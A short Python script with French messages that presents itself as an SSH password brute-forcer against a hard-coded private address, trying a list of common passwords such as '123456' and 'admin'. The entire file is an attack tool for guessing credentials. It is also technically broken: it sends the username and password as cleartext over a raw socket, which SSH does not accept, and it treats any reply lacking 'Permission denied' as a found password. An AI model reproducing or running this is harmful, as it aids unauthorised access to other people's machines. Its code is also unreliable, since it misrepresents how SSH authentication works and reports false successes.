import socket

target = "10.27.8.42"
port = 22

common_passwords = ["password", "123456", "qwerty", "azerty", "1234", "admin"]

def ssh_bruteforce(username, password):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((target, port))
        banner = sock.recv(1024).decode('utf-8')
        if 'SSH' not in banner:
            print("Le service n'est pas un serveur SSH.")
            return False
        
        sock.send(f'{username}\n'.encode('utf-8'))
        sock.send(f'{password}\n'.encode('utf-8'))
        
        response = sock.recv(1024).decode('utf-8')
        if 'Permission denied' not in response:
            print("Mot de passe trouvé pour SSH:", password)
            return True
        else:
            return False
    except Exception as e:
        print("Erreur:", e)
        return False
    finally:
        sock.close()
    